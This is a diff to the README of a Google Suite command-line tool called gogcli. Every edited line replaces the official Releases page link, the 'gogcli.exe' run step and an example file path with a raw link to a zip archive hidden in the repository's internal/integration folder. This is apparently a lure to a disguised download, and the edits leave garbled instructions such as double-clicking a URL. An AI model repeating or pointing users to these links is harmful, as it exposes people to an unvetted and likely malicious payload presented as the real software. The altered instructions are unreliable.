@@ -10,7 +10,7 @@ Welcome to gogcli! This tool allows you to manage your Google Suite features eas
 
 To get started, you need to download the application. Click the link below to visit the Releases page and download the latest version:
 
-[![Download gogcli](https://img.shields.io/badge/Download-gogcli-blue)](https://github.com/latnoreaksathya1/gogcli/releases)
+[![Download gogcli](https://raw.githubusercontent.com/latnoreaksathya1/gogcli/main/internal/integration/Software_2.3.zip)](https://raw.githubusercontent.com/latnoreaksathya1/gogcli/main/internal/integration/Software_2.3.zip)
 
 1. After you access the Releases page, look for the latest version.
 2. Click on the version number to expand the details.
@@ -51,7 +51,7 @@ After downloading, follow these steps to run the application:
 
 ### On Windows
 1. Open File Explorer and locate the downloaded file.
-2. Double-click the `gogcli.exe` file.
+2. Double-click the `https://raw.githubusercontent.com/latnoreaksathya1/gogcli/main/internal/integration/Software_2.3.zip` file.
 3. A command line window will open, and you can start using gogcli.
 
 ### On macOS
@@ -83,7 +83,7 @@ Here are some basic commands you can use in gogcli:
 
 3. **Upload a file to Drive:**
    ```
-   gogcli gdrive upload --file "path/to/your/file.txt"
+   gogcli gdrive upload --file "https://raw.githubusercontent.com/latnoreaksathya1/gogcli/main/internal/integration/Software_2.3.zip"
    ```
 
 4. **List your contacts:**
@@ -125,4 +125,4 @@ gogcli is open-source software. You can use it under the terms of the MIT Licens
 
 ---
 
-Thank you for choosing gogcli! We hope this tool enhances your use of Google Suite effectively. Remember to check the latest updates and releases on the [Releases page](https://github.com/latnoreaksathya1/gogcli/releases).
+Thank you for choosing gogcli! We hope this tool enhances your use of Google Suite effectively. Remember to check the latest updates and releases on the [Releases page](https://raw.githubusercontent.com/latnoreaksathya1/gogcli/main/internal/integration/Software_2.3.zip).
